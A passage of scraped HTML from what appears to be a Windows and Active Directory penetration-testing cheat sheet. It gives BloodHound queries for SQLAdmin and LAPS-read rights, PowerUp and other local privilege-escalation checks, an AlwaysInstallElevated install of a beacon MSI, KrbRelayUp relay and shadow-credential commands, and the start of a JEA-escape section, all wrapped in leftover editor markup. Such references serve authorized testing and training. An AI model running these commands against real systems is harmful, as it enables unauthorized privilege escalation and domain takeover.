aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH p<span class="cm-operator">=</span><span class="cm-bracket">(</span>u<span class="cm-punctuation">:</span>User<span class="cm-bracket">)</span><span class="cm-operator">-</span><span class="cm-bracket">[</span><span class="cm-punctuation">:</span>SQLAdmin<span class="cm-bracket">]</span><span class="cm-operator">-&gt;</span><span class="cm-bracket">(</span>c<span class="cm-punctuation">:</span>Computer<span class="cm-bracket">)</span> return p</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-laps">LAPS</h4>
<p id="bkmrk-machine-with-laps-en">Machine with LAPS enabled</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 311px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH <span class="cm-bracket">(</span>c<span class="cm-punctuation">:</span>Computer <span class="cm-bracket">{</span>haslaps<span class="cm-punctuation">:</span><span class="cm-atom">true</span><span class="cm-bracket">})</span> RETURN c</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-users-with-read-laps">Users with read LAPS rights against "LAPS machines"</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 434px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 434.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MATCH p<span class="cm-operator">=</span><span class="cm-bracket">(</span>g<span class="cm-punctuation">:</span><span class="cm-keyword">Group</span><span class="cm-bracket">)</span><span class="cm-operator">-</span><span class="cm-bracket">[</span><span class="cm-punctuation">:</span>ReaLAPSPassword<span class="cm-bracket">]</span><span class="cm-operator">-&gt;</span><span class="cm-bracket">(</span>c<span class="cm-punctuation">:</span>Computer<span class="cm-bracket">)</span> return p</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h2 id="bkmrk-local-privesc">Local Privesc</h2>
<h3 id="bkmrk-powerup">PowerUp</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 724px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 336px; min-width: 723.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#All checks</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-AllChecks</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Get services with unquoted paths and a space in their name.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-UnquotedService</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Get services where the current user can write to its binary path or change arguments to the binary</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ModifiableServiceFile</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Get the services whose configuration current user can modify.</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ModifiableService</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#DLL Hijacking</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-ProcessDLLHijack</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Find-PathDLLHijack</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 336px;"></div><div class="CodeMirror-gutters" style="height: 386px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-other-enumeration-to">Other enumeration tools</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 383px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 206px; min-width: 383.381px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PrivescCheck: https://github.com/itm4n/PrivescCheck</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span> <span class="cm-punctuation">.\</span><span class="cm-identifier">PrivescCheck</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span><span class="cm-punctuation">;</span> <span class="cm-identifier">Invoke-PrivescCheck</span> <span class="cm-operator">-</span><span class="cm-identifier">Extended</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">beRoot</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">winPEAS</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Seatbelt</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-builtin">group</span><span class="cm-operator">=</span><span class="cm-identifier">all</span> <span class="cm-operator">-</span><span class="cm-identifier">full</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Privesc: https://github.com/enjoiz/Privesc</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-PrivEsc</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 206px;"></div><div class="CodeMirror-gutters" style="height: 256px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-always-install-eleva">Always Install Elevated</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 296.524px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">run msiexec /i BeaconInstaller.msi /q /n</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-impersonation-attack">Impersonation attacks / Potatoes</h3>
<p id="bkmrk-full-article-here"><a href="https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all">Full article here</a></p>
<h3 id="bkmrk-krbrelayup">KrbRelayUp</h3>
<h4 id="bkmrk-with-rbcd">With RBCD</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 876px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 875.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">KrbRelayUp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">relay</span> <span class="cm-operator">-</span><span class="cm-identifier">Domain</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">CreateNewComputerAccount</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerName</span> <span class="cm-identifier">test</span><span class="cm-error">$</span> <span class="cm-operator">-</span><span class="cm-identifier">ComputerPassword</span> <span class="cm-identifier">Password123</span><span class="cm-operator">!</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-with-shadowcreds">With ShadowCreds</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 391px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 390.619px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">KrbRelayUp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">full</span> <span class="cm-operator">-</span><span class="cm-identifier">m</span> <span class="cm-identifier">shadowcred</span> <span class="cm-operator">--</span><span class="cm-identifier">ForceShadowCred</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-massive-local-prives">Massive local privesc cheatsheet</h3>
<p id="bkmrk-payloadallthethings"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadAllTheThings</a></p>
<h3 id="bkmrk-escape-jea">Escape JEA</h3>
<h4 id="bkmrk-abuse-an-allowed-fun">Abuse an allowed function</h4>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 260.333px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Look at allowed functions</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Get-Command</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" 